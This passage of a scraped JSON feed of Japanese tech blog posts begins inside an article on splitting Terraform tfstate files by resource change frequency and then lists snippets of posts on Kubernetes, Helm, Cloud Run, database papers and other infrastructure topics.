同じリモートバックエンドの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 cicd│    └── terraform.tfstate # cicdコンポーネントの状態を持つ│├── \uD83D\uDCC2 datastore│    └── terraform.tfstate # datastoreコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの状態の変更頻度グループ別この分割方法についてAWSリソースの状態の変更頻度グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各変更頻度グループの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。https://www.reddit.com/r/Terraform/comments/126jwa1/comment/jea9bjk/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button▶ おすすめ度について【変更頻度グループ別】状態の依存関係図例えば、以下の変更頻度グループに分割した状況と仮定します。変更高頻度グループ変更中頻度グループ変更低頻度グループここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、変更低頻度グループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの状態の変更頻度グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            high[\\"high-freq-tfstate<br>例: API Gateway, CloudFront, CloudWatch, IAM\\"]            middle[\\"middle-freq-tfstate<br>例: ALB, EC2, ECS, EKS, ElastiCache, RDS, S3, SES, SNS\\"]            low[\\"low-freq-tfstate<br>例: Route53, VPC\\"]            high-...->low            middle-..->low        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 high-freq # 高頻度変更グループ│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── cloudwatch.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 low-freq # 低頻度変更グループ│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── route53.tf│    ├── vpc.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 middle-freq # 中頻度変更グループ (高頻度とも低頻度とも言えないリソース)      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── elasticache.tf      ├── rds.tf      ├── s3.tf      ├── ses.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する           ...【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 high-freq│    └── terraform.tfstate # high-freqコンポーネントの状態を持つ│├── \uD83D\uDCC2 middle-freq│    └── terraform.tfstate # middle-freqコンポーネントの状態を持つ│└── \uD83D\uDCC2 low-freq      └── terraform.tfstate # low-freqコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...10. おわりにTerraformのtfstateファイルの分割パターンをもりもり布教しました。ぜひ採用してみたい分割パターンはあったでしょうか。Terraformの開発現場の具体的な要件は千差万別であり、特にtfstateファイル間の状態の依存関係は様々です。もし、この記事を参考に設計してくださる方は、分割パターンを現場に落とし込んで解釈いただけると幸いです\uD83D\uDE47\uD83C\uDFFB‍「自分を信じても…信頼に足る仲間を信じても…誰にもわからない…」(お友達の@nwiizo, 2023, Terraform Modules で再利用できるので最高ではないでしょうか？)謝辞今回、Terraformの分割パターンの収集にあたり、以下の方々からの意見・実装方法も参考にさせていただきました。@kiyo_12_07 さん@masasuzu さん@tozastation さん(アルファベット順)この場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Terraform in Action (English Edition)作者:Winkler, ScottManningAmazonTerraform: Up and Running: Writing Infrastructure as Code作者:Brikman, YevgeniyO\'Reilly MediaAmazon","isoDate":"2023-07-04T15:17:56.000Z","dateMiliSeconds":1688483876000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"光に負けルナ~Google Cloudでのマルチリージョンデータベースについて~","link":"https://zenn.dev/nnaka2992/articles/to_beat_light_speed_on_google_cloud_databases","contentSnippet":"クラウドを利用する一番のメリットの一つとしてオンデマンドでリソースを調達し、アクセス負荷に応じてスケールイン・アウト出来ることが上げられます。そのため大体のアプリケーションではシングルリージョンまたは隣接するリージョン2~3程度で運用を始めることが多いと思います。(日本の場合asia-northeast-1とasia-northeast-2など)アプリケーションがグローバルに拡大すると、それだけ物理的な距離が広がりユーザ・サーバ間のアクセスにかかる時間が拡大します。例えばユーザ・サーバ共に日本にある場合(沖縄・北海道間約3,000km)、ネットワークによる遅延は片道約15ms以下...","isoDate":"2023-07-03T15:39:08.000Z","dateMiliSeconds":1688398748000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"スリーシェイクに入社しました！","link":"https://bells17.medium.com/3-shake-279ea982b977?source=rss-713cf42ce34d------2","isoDate":"2023-07-03T14:10:50.000Z","dateMiliSeconds":1688393450000,"authorName":"bells17","authorId":"bells17"},{"title":"Copilotでらくらくコードリーディング","link":"https://zenn.dev/nnaka2992/articles/code_reading_with_copilot","contentSnippet":"GitHub Copilot便利ですね。2021年にTechnical Previewとして発表された時から便利だ便利だと言われていたGitHub Copilotに、2023年の4月末ごろからデビューしました。デビューしたは良いものの最近は仕事ではコーディングよりアーキテクト的な方面でのお仕事が多かったり、個人の時間でもコーディングするよりOSSのコードを読むことのほうが多くコーディングのアシスタントツールとしては使いこなせていません。そのため最近はPostgreSQLのコードを読むときのアシスタントとして利用することが多いです。なのでこの記事ではCopilotでコードリーディン...","isoDate":"2023-06-28T14:41:21.000Z","dateMiliSeconds":1687963281000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud RunのSidecarでJVMのmetricsの取得してみた","link":"https://zenn.dev/satohjohn/articles/25bc5879de7832","contentSnippet":"概要Cloud Runのmetricsをデフォルトで取得している指標(metrics)以外の指標が他に欲しい場合、どうするのが良いのかを考えてみました。ちょうどCloud RunのSidecar機能がでたので、それを使います。他の指標を、ここではJVMのmetricsとします。Cloud Run上のJVMのmetricsが取れて何が嬉しいのかについては、一旦考えません。後にCloud Runの最大起動時間が増えた場合は、意味があるかもしれません。 構成図にすると以下のような感じになります。Cloud RunでSpring Bootアプリケーションを立ち上げClou...","isoDate":"2023-06-28T12:03:00.000Z","dateMiliSeconds":1687953780000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ロクに勉強してこなかったエンジニアが輪読会参加とかPCA受験に向けて勉強とかしてみた話","link":"https://qiita.com/bayobayo0324/items/56f93f50fa0115dc4d6d","contentSnippet":"この記事について40歳でフリーランスから転職をきっかけに会社員エンジニアになって、社内のエンジニアの熱意に影響を受けて勉強をはじめてみた中年エンジニアの感想とか気づきとかです。先に結論勉強する…","isoDate":"2023-06-27T12:31:17.000Z","dateMiliSeconds":1687869077000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"やさしいERC20開発","link":"https://speakerdeck.com/shukob/yasasiierc20kai-fa","contentSnippet":"https://cryptocurrency.connpass.com/event/287311/\\r\\rEthereumスマートコントラクトライブラリ「OpenZeppelin」を用いてERC20コントラクトをSepolia Testnetにデプロイし、基本的な操作を体験していただけます。\\r\\rRemixを使用し、OpenZeppelinを用いて基本的な送金、EOAへの委任と、\\rコントラクトへ委任し、ETHを送るとERC20が送金される自動販売機のようなスマートコントラクトの実装を行います。","isoDate":"2023-06-23T04:00:00.000Z","dateMiliSeconds":1687492800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"SRETT#6_Terraformのtfstateについて考える","link":"https://speakerdeck.com/masasuzu/srett-number-6-terraformnotfstatenituitekao-eru","contentSnippet":"","isoDate":"2023-06-22T04:00:00.000Z","dateMiliSeconds":1687406400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"アプリ開発者のための kubectl 講座","link":"https://zenn.dev/toshikish/articles/6a06017747cbba","contentSnippet":"これは何Kubernetes クラスタ管理者とアプリケーション開発者が分業しているプロジェクトで，開発者が必ずしも Kubernetes に詳しくない場合を想定し，開発時に使いそうな kubectl のコマンドをまとめたものです。クラスタ管理者から開発者にこのドキュメントを適宜改変して渡し，開発者がある程度自立して操作できるようになることで，管理者への問い合わせ負荷を減らすのが狙いです。場合によってはハンズオンで講座を開いてもよいでしょう。 ドキュメント案ここでは Amazon EKS でクラスタを構築する場合の例を示します。別のインフラに構築している場合は適宜書き換え...","isoDate":"2023-06-19T06:03:18.000Z","dateMiliSeconds":1687154598000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Terraform 静的検査ツール比較","link":"https://zenn.dev/tayusa/articles/9829faf765ab67","contentSnippet":"対象tfsectflintKICSCheckovSnyk tfsechttps://github.com/aquasecurity/tfsechttps://aquasecurity.github.io/tfsec/v1.28.1 特徴CI系公式のdocker imageがあるhttps://github.com/aquasecurity/tfsec#use-with-dockerGitHub Actionがあるhttps://github.com/aquasecurity/tfsec-pr-commenter-actionGitH...","isoDate":"2023-06-15T17:00:00.000Z","dateMiliSeconds":1686848400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"editcap で tcpdump のキャプチャファイルから指定の時間帯を切り出す","link":"https://blog.1q77.com/2023/06/editcap/","contentSnippet":"課題ちょっと大きめ (時間範囲の広い) pcap ファイルがあって、wireshark で見るにしてもちょっと大きすぎるなということがありました。見たい時間帯だけに絞ったファイルにできないかなと思い調べたメモです。","isoDate":"2023-06-15T14:46:42.000Z","dateMiliSeconds":1686840402000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub の Reusable workflow で working-directory に変数を使う","link":"https://zenn.dev/toshikish/articles/be970407f02098","contentSnippet":"やりたいことGitHub Actions の reusable workflow で，作業ディレクトリを入力変数で変えたい場合を考えます。on:  workflow_call:    inputs:      workdir:        required: true        type: string うまくいかない方法ワークフロー全体のステップのデフォルト設定 defaults.run.working-directory では，現時点ではコンテキストと式が許可されていません。したがって，入力変数でディレクトリ名を受け取って上記に入れても動作しません。...","isoDate":"2023-06-15T05:22:24.000Z","dateMiliSeconds":1686806544000,"authorName":"toshikish","authorId":"toshikish"},{"title":"PandocのLuaフィルタからPandoc templateを呼べるpandoc.templateモジュールがとても便利","link":"https://blog.atusy.net/2023/06/12/pandoc-template-module/","contentSnippet":"Pandoc 3.0以降ではLuaフィルタで使えるモジュールにpandoc.templateが追加されました。これを使うとLuaフィルタ内でPandoc Templateを展開できます。","isoDate":"2023-06-12T00:00:00.000Z","dateMiliSeconds":1686528000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"KubeconformをGitLab CIに組み込んで、k8sのマニフェストがAPIの仕様に沿うか検査する","link":"https://zenn.dev/tayusa/articles/1aa96e6ceb838a","contentSnippet":"はじめにk8sマニフェストを普段管理していないメンバーがマニフェストのファイルを変更する場面があります。その際のレビューを出来るだけ自動化したくkubeconformを導入しました。 KubeconformマニフェストがAPIの仕様に沿うか検査してくれます。https://github.com/yannh/kubeconform自分でスキーマを用意すればIstio、Argo Rollouts、Argo Workflowsのような外部のAPIも検査できます。 スキーマの生成スキーマの生成はpythonのスクリプトが用意されているので、これをCRDを引数で渡し実行しま...","isoDate":"2023-06-11T17:19:45.000Z","dateMiliSeconds":1686503985000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"plutoをGitLab CIに組み込んで非推奨のk8s apiVersionを検出する","link":"https://zenn.dev/tayusa/articles/79a3f54d8f21bc","contentSnippet":"はじめにk8sのバージョンが上がるとAPIが再編成されたりアップグレードされたりします。新しいAPIが出ると古いAPIは非推奨になり最終的には削除されます。なので、k8sのバージョンアップ時はDeprecated API Migration Guideなどを見て非推奨のapiVersionが使われていないか確認して時には修正する必要があります。https://kubernetes.io/docs/reference/using-api/deprecation-guide/例CronJob の batch/v1beta1 -> batch/v1 plutoplu...","isoDate":"2023-06-11T17:18:13.000Z","dateMiliSeconds":1686503893000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Istio Canary Upgrade by Helm","link":"https://zenn.dev/tayusa/articles/03cf961e2409bd","contentSnippet":"前提helmfileを利用istioのrevisionTagを利用関係のない設定は省略 Upgradeの前にInstall ディレクトリ構成├── helmfile_istio-base.yaml├── helmfile_istio-ingressgateway.yaml├── helmfile_istiod-1-16-0.yaml└── values    ├── istio-base.yaml    ├── istio-ingressgateway.yaml    └── istiod.yaml helmfile helmfile_isti...","isoDate":"2023-06-11T17:17:37.000Z","dateMiliSeconds":1686503857000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Helmに入門したので、躓いたところを振り返る","link":"https://zenn.dev/tayusa/articles/e9285c6c4c09a1","contentSnippet":"はじめにアプリのマニフェストを管理するのにKustomizeを使っていたのですが、同じようなマニフェストが乱立したので管理を楽にするためにHelmに移行しました。Helmを一から書いたのは初めてだったので、躓いた点をここに残します。 quote関数の進数変換0から始まる数値をquote関数を使って文字列にすると進数変換が起こり想定した値ではなくなる下記のようなtemplateでidとして0000000060のような値を渡すと、8進数として解釈され10進数である48に変換されてしまいます。...id: {{ .id | quote }}...0から始まる数値はtem...","isoDate":"2023-06-11T17:16:25.000Z","dateMiliSeconds":1686503785000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"ビットコイン・ブロックチェーン入門","link":"https://speakerdeck.com/shukob/bitutokoinburotukutienru-men-40047fd3-985e-4c8f-b34b-1ea610be2535","contentSnippet":"https://cryptocurrency.connpass.com/event/286818/\\r初学者の方向けにビットコイン技術の全体像をお話ししました。","isoDate":"2023-06-10T04:00:00.000Z","dateMiliSeconds":1686369600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Go言語でNetlinkを少し触った話","link":"https://zenn.dev/bells17/articles/netlink-goexample","contentSnippet":"Go言語でNetlinkを少し触ったのでメモ。具体的にはGo言語でNetlinkというネットワーク関連のライブラリを使ってStatic Routeを設定したりするサンプルを作ったりした。https://github.com/bells17/netlink-gosample Netlinkとは調べた範囲だと、Linuxカーネルのサブシステムの1つで、ルーティングテーブルの管理などのネットワーク関連の設定などを行う際に利用されるもの、という理解をしている。Netlinkは、Linuxカーネルとユーザ空間プロセス間の、またはカーネル内の通信を提供するためのIPC（Inter-pro...","isoDate":"2023-06-08T18:03:10.000Z","dateMiliSeconds":1686247390000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes 1.27 以降のバッチ処理の改善","link":"https://zenn.dev/toversus/articles/d6065bea460871","contentSnippet":"Kubernetes 1.27 以降で実装済みまたは予定されているバッチ処理の改善に繋がる KEP や Kubernetes のサブプロジェクトの現状を見ていきます。 KEP-3673: Kubelet limit of Parallel Image Pulls!Kubernetes 1.27 時点でアルファ機能です。1.28 でベータを目指していますが、設定はデフォルトで無効化されています。Pod の起動にノードのスケールアウトが必要な場合に、Pod の起動時間の短縮が期待できます。バッチ処理の Pod が一斉に起動するケースで恩恵を受けられそうです。Kubelet は...","isoDate":"2023-06-08T03:46:32.000Z","dateMiliSeconds":1686195992000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"asdf の代わりに rtx を使う","link":"https://blog.1q77.com/2023/06/rtx/","contentSnippet":"asdf とはnodeenv とか rbenv とか tfenv とか XXenv がそれぞれ .xxx-version というファイルにそのディレクトリ配下で使用する software の version を指定するという仕様があり、それらをまとめてやってくれる asdf というツールが登場し、.tool-versions というファイルに複数のソフトウェアのバージョンを指定できるようになりました。 (aqua はまだ使ったことがない)","isoDate":"2023-06-07T01:25:11.000Z","dateMiliSeconds":1686101111000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"PC作ってみた","link":"https://moz-security.hatenablog.com/entry/2023/06/04/172414","contentSnippet":"SECCON Beginners CTF 2023 でボコボコにされて、少し萎えていますが、超絶久しぶりにブログでも書きます。なぜ自作PCまず、4月29, 30日（土・日）にGMOインターネットグループが開催するDevSecOpsThon2023というイベントに参加しました。これに関しては、イベント直後に、参加記を書こうと思っていたのですが、書かんといけないな〜と思いながら、2週間も経つと、完全に書く気がなくなりました。気になる方は、下に他の参加者さんが書いたリンクを貼っているのでそちらからご覧ください。イベントの参加者には、自宅サーバ勢が多く、確か半分くらいは、自宅にサーバを立てていたと思います。イベント自体が、インフラハッカソンというちょっと変わったイベントで、ハードウェアやOS、ミドルウェアといった低レイヤの知識を必要としており、もう自宅サーバ勢が無双状態で、自分の知識の欠如を非常に実感しました。そこで、その人たちに近づくための第一歩として、自作PCに取り組もうと思いました。developers.gmo.jpDevSecOpsThon2023 参加ブログ・DevSecOpsThonに参加してきた・「DevSecOpsThon at GMO kitaQ」に参加したらすごく良かった件！！ - Qiita・DevSecOpsThon2023 at GMO kitaQ - Qiita・【\uD83D\uDCDD】DevSecOpsThon at GMO kitaQ\xa0自作PCに取り組むこれに取り組んだのは、5月27, 28日でした。この理由は、25日に給料日だったからですね。まずは、パーツの選択と購入から始めました。別にゲーム用途ではないため、GPUはいらない代わりに、グラフィック機能があるCPUにしたり、メモリの拡張性を考えて、4スロットあるマザーボードにしたりしました。初めての自作PCということで、そこまでスペックのいいものを作る気は最初からなく、まぁ10万円くらいかなと考えていたのですが、メモリやSSDが思ったよりも安く、7万円くらいで全てのパーツを購入することができました。購入したパーツが届いたら、あとは組み立てるだけでした。ググったら、自作PCについてのサイトはたくさん出てきましたが、正直マザーボードとPCケースの取扱説明書だけでも十分なほど説明が細かく書いてあります。全てのパーツをマザーボードにくっつけるだけなので、そこまで難しくはなく、電源など配線が終わったら、本当に起動してくれるのかドキドキしながら、電源ボタンを押しました。プラス端子とマイナス端子を逆にしていないかなど心配しながらも、BIOS画面が立ち上がった時はとても安心したし、嬉しかったです。ここまできたら、あとはブータブルUSBからOSを起動するだけで、無事に初めての自作PCを完成させることができました。今は、仮想マシンを複数台起動していて、それを使って、遊びつつ、勉強していこうと思っています。とりあえずは、Kubernetesクラスタを組んでみたり、脆弱性検証から始めていこうって感じです。自作PCのメモについては、下のリンク先にあります。moz-security.me作ってみて自作PCというと、とてもハードルが高いように感じますが、実際に作ってみると意外と簡単だし、色々と勉強になることもたくさんあります。また、デスクトップという制約はあるものの、同じ値段であれば、ノートPCよりもいいスペックで構築することができるし、店頭にあるデスクトップPCと比べても、自分で改造できるため、拡張性があるといったメリットがあります。一度だけでも作ってみるのはおすすめです。（自分に合わなければ、2度目をなくせばいいだけ）","isoDate":"2023-06-04T08:24:14.000Z","dateMiliSeconds":1685867054000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Redis公式のGoクライアントライブラリrueidisを試してみた","link":"https://qiita.com/bayobayo0324/items/8ac3e27eef360a316ad2","contentSnippet":"This 記事 is 何？Twitterぼんやり見てたらRedis公式のGo用クライアントライブラリが出てたとかで、自身のプロジェクトにどの程度簡単に入れられるのかなーと思い試してみました。公式…","isoDate":"2023-05-31T12:02:25.000Z","dateMiliSeconds":1685534545000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"データフレームからの表組みを楽にするftExtra 0.6.0をリリース！脚注の書式指定が柔軟に！！","link":"https://blog.atusy.net/2023/05/30/ftextra-0-6-0/","contentSnippet":"ftExtra 0.6.0では、脚注に関する機能が強化されました。ftExtraパッケージはRで表を出力する際に、セルの文字列をマークダウンとしてフォーマットする機能などを提供するパッケージです1。デフォルトではR Markdownと同様にマークダウン方言としてPandoc’s Markdownを採用しており、^[aaa]といった記法で脚注を記載できます。","isoDate":"2023-05-30T00:00:00.000Z","dateMiliSeconds":1685404800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"日本のビットコイン決済を振り返る","link":"https://speakerdeck.com/shukob/ri-ben-nohitutokoinjue-ji-wozhen-rifan-ru","contentSnippet":"https://cryptocurrency.connpass.com/event/280644/\\r2023年5月ビットコインとかミートアップでビットコイン決済についてLTしました。","isoDate":"2023-05-27T04:00:00.000Z","dateMiliSeconds":1685160000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"OLAPデータベースを支える技術","link":"https://zenn.dev/nnaka2992/articles/technics_behind_analytical_database","contentSnippet":"今年に入ってからCarnegie Mellon UniversityのAdvanced Database SystemsでReading Assignmentとして出ている論文リストで必須とされているものや講義資料を読みました。https://nnaka2992.hatenablog.com/archive/category/論文この記事では紹介されていた論文やAdvanced Database Systemsの講義資料・動画を振り替えることで、BigQueryやRedShift、Snowflakeといった最新の分析用データベースがどのように優れたパフォーマンスを実現しているかを考え...","isoDate":"2023-05-25T00:02:49.000Z","dateMiliSeconds":1684972969000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"leap.nvimを拡張して検索対象にラベルをつけて飛べるleap-search.nvimを作った","link":"https://blog.atusy.net/2023/05/24/leap-onto-matched-patterns/","contentSnippet":"本記事はVim駅伝の5/24の記事です。leap.nvimについてeasymotion系のNeovimプラグインとしてメジャーどころにはhop.nvimやleap.nvimがあります。leap.nvimはいわゆるeasymotion系のプラグインで、入力した文字にマッチする箇所にラベル（a, b, c, …）をつけ、ラベルを入力するとその位置にカーソルを移動します。デフォルトの挙動はeasymotionの2-character search motionに近いもので、2文字にマッチする箇所にラベルをつけます。","isoDate":"2023-05-24T00:00:00.000Z","dateMiliSeconds":1684886400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"PandocでドキュメントのYAMLフロントマター（メタデータ）を抽出する","link":"https://blog.atusy.net/2023/05/18/pandoc-extract-metadata/","contentSnippet":"以下のようなMarkdownファイルがあってYAMLフロントマターから .data.hoge を取り出したい、みたいなことはしばしばあります。---title: タイトルauthor: atusydata: hoge: fuga---なんかコンテンツこういう時、うまく grep コマンドとか使ってやるのも手ですが、Pandocの力でYAMLファイルを生成しても面白いでしょう。","isoDate":"2023-05-18T00:00:00.000Z","dateMiliSeconds":1684368000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"現在のDremelの実装を解説した論文を読みました ","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/17_dremel","contentSnippet":"この記事の趣旨2020年に発表されたBigQueryの元となったGoogle内で利用されている分析向けデータベースであるDremelの実装を解説した論文を読みました。Dremel: A Decade of Interactive SQL Analysis at Web Scale著者についてSergey Melnik, Andrey Gubarev, Jing Jing Long, Geoffrey Romer, Shiva Shivakumar, Matt Tolton,Theo Vassilakisら2010年のDremel発表論文の著者らと、Hossein Ahmadi, Dan Delorey, Slava Min, Mosha Pasumansky, Jeff ShuteらGoogleで分析ワークロードと分散処理に関わる著者らによる論文。概要BigQueryの元となったGoogleのDremelの10年間を振り替えってアーキテクチャについて説明した論文。Dremelは現代のクラウドネイティブ分析ツールで一般的になっている、計算リソースとストレージの分解、カラムナストレージ、in situデータ分析などを統合した最初のツールである。手法SQLの採用Googleでは殆どのデータはBigTableなどNoSQLデータベースで管理されていたため、SQLを用いないデータアクセスが主流であった。しかしトランザクション型ビッグデータシステムにおける、SQLの採用に共ないDremelでもSQLを採用した。ストレージの分離メモリの分離MapReduceのシャッフルのボトルネックを回避するためにDisaggregated Memory Shuffle Systemを採用した。In situデータ分析への対応DBMSへのデータロードを必要としないデータ分析のことで、DremelではGFSに移行するときにGoogle内で共有のストレージフォーマットを使用することでGoogle内のデータに対応した。加えてGoogle Cloud StorageやGoogle Drive、MySQL、BigTableなどからのデータ取得もフェデレーションとして対応した。サーバレスアーキテクチャフォールトトレラントリスタート、仮想スケジューリングユニットによりマルチテナントかつオンデマンドなリソースを提供可能とし、低価格な利用を可能とした。現在ではサーバレスアーキテクチャを進化させ、集中型スケジューリングやShuffle Persistent Layer、柔軟なDAG実行、動的クエリ実行などを実装することでより優れたサーバレスアーキテクチャを実現した。ネストデータにおけるカラムナストレージ[[32])]Figure 5Figure 6Figure 7クエリレイテンシの最小化インタラクティブな実行のレイテンシは大きくなる。それを解決するためにDremelではスタンバイサーバプール、マルチレベル実行ツリー、列指向スキーマ表現、CPUとIO負荷のバランス調整、ファイルオペレーションの再利用、保証されたキャパシティ、適合的なクエリスケーリングにより実現している。作業時間read27:5027:50author32:024:12summary68:5026:48","isoDate":"2023-05-15T02:14:20.000Z","dateMiliSeconds":1684116860000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Tailscale + Samba + NextCloudでおうちクラウド始めた","link":"https://blog.atusy.net/2023/05/12/tailscale-nextcloud/","contentSnippet":"外出先から家にあるデータにアクセスしたい（義）両親に家族写真を共有したいデバイス間でデータを同期したいデータ容量の制限を考えたくないセキュリティはそこそこ欲しい変なデータ混ざっても垢BANされたくないこういった要望を叶えるためにtailscaleで構築したVPN内でのみアクセスできるSamba（ファイル共有）とNextCloud（DropBox的なもの）をたててみました。","isoDate":"2023-05-12T00:00:00.000Z","dateMiliSeconds":1683849600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Connection draining for Service type LoadBalancer","link":"https://zenn.dev/toversus/articles/1682d275ef1bb7","contentSnippet":"はじめにService リソースは Kubernetes のサービス検出を支えるコアリソースです。Service のデータプレーンとして kube-proxy を使用している場合は、各ノード上の iptables や ipvs を設定することで L4 負荷分散を実現しています。Kubernetes は、結果整合性 (Eventual Consistency) の上に成り立つ分散システムです。Kubernetes のコントロールプレーンが Pod を削除する時に、全てのノード上のルーティングルールを更新してから Pod を削除したりはしません。削除中の Pod にもトラフィックが流...","isoDate":"2023-05-11T09:43:47.000Z","dateMiliSeconds":1683798227000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"TiDBで学ぶNewSQLのアーキテクチャ for Beginners","link":"https://zenn.dev/nnaka2992/articles/learning_tidb_internal_for_beginner","contentSnippet":"はじめにこの記事ではNewSQLの特徴であるノード間の分散とトランザクションや分断耐性などがTiDBではどのような技術によって実現されているかを説明することを目的としています。Spannerの論文が2012年に発表されてから10年以上の年月が流れ、優れた論文や実装ドキュメント、個人による解説ブログなど技術的詳細について述べた資料は多くあります。加えてこの記事を入門的なものと位置づけているため各コンポーネントを網羅的に解説するというよりは、キーコンセプトをどのように実装しているのかを実験を混じえながら動作の実現方法の解説を中心に扱います。また今回はTiDBをベースに説明し...","isoDate":"2023-05-11T01:18:19.000Z","dateMiliSeconds":1683767899000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"クエリオプティマイザの精度を検証した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/16_query_optimization_performance","contentSnippet":"この記事の趣旨2015年に発表されたクエリオプティマイザにおけるカーディナリティ推定とコストモデル、列挙アルゴリズムの貢献度を評価した論文を読んでいきます。How Good Are Query Optimizers, Really?著者についてViktor Leis、Andrey Gubichev、Atanas Mirchev、Peter Boncz、Alfons Kemper、Thomas Neumannらのグループによる論文。ほとんどのメンバーはDBMSにおける最適化について研究しているが、Atanas 